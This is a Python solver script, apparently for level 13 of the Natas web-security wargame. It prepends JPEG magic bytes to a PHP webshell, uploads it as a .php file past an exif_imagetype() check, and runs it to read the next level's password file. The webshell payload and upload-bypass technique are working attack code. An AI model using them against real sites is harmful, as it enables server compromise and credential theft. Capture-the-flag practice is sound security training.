import re
from src.natas.base_level import NatasLevel
import os
import time

class Level_13(NatasLevel):

  num = 13
  explanation = "On this level, exif_imagetype() checks the file's magic bytes.\n     We prepend the JPEG signature (FFD8FFE0) to the PHP webshell to bypass the image validation."

  def exploit(self) -> str:

    resp        = self.session.get(self.base_url)
    php_file    = "shell.php"
    php_content = (
      b"\xff\xd8\xff\xe0"
      b'<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>'
    )

    with open(php_file, "wb") as file:
      file.write(php_content)

    match       = re.search(r'(?<=value=")[a-zA-Z0-9]+\.jpg', resp.text)
    random_name = match.group()

    resp_php    = self.session.post(self.base_url + "/index.php", files ={
      'filename': (None, f'{random_name}.php'),
      'uploadedfile': ('shell.php', open(php_file, 'rb'))
    }, data = {'MAX_FILE_SIZE': '1000'})

    match_php = re.search(r'The file <a href="([^"]+)"', resp_php.text, re.MULTILINE).group(1).strip()
    resp_pass = re.search(r"\b[a-zA-Z0-9]{32}\b", self.session.get(self.base_url + f"/{match_php}").text).group()

    time.sleep(0.5)
    if os.path.exists(php_file):
      os.remove(php_file)
    else:
      pass

    return resp_pass
